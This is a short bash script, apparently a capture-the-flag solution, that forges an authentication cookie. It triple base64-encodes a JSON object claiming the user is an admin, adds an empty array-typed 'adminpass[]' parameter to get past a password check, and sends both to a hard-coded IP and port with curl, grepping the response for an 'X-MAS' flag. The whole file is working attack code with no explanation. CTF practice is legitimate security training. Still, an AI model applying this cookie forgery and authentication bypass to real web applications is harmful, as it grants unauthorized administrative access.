#!/bin/bash

COOKIE=`echo -n '{"id":"1","type":"admin"}' | base64 -w 0 | base64 -w 0| base64 -w 0`

curl --cookie "cookiez=$COOKIE;adminpass[]=" http://199.247.6.180:12008/ 2>/dev/null | grep "X-MAS"